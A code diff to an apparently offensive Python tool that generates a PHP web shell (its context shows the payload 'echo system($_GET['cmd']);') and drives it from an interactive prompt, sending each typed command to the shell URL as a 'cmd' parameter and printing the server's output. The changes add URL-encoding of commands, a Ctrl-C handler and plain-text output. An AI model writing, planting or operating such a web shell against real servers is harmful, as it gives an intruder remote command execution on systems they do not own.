@@ -1,6 +1,7 @@
-from bs4 import BeautifulSoup
 import urllib.request
 from optparse import OptionParser
+import urllib.parse
+import signal
 
 banner= """
 
@@ -48,6 +49,16 @@ __      _____| |__   | |_/ / __ _  ___| | ____| | ___   ___  _ __
 
 """)
 
+
+def signal_handler(signal, frame):
+
+    print ("\n[-] Exiting")
+
+    exit()
+
+signal.signal(signal.SIGINT, signal_handler)
+
+
 parse.add_option("-u","--url",dest="url",type="string",help="shell url ")          
 parse.add_option("-g","--generate",dest="gene",type="string",help="shell name")
 (opt,args)=parse.parse_args()
@@ -72,12 +83,16 @@ echo system($_GET['cmd']);
     if opt.url!=None and opt.gene==None:
         url=str(opt.url)
         print(banner)
+        d=""
         while True:
             #buff=""
             cmd=str(input("$ "))
-            openurl=urllib.request.urlopen(url+"?cmd={0}".format(cmd))
+            param={"cmd":cmd}
+            cmden=urllib.parse.urlencode(param)
+            #print(url+"?"+cmden)
+            openurl=urllib.request.urlopen(url+"?"+cmden)
             reponse=str(openurl.read())
-            soup=BeautifulSoup(reponse,"html.parser")
+            #soup=BeautifulSoup(reponse,"html.parser")
             #for i in soup
-            print(soup.prettify())
+            print(reponse.replace('\\n', '  \n'))
             #print(soup.get_text())
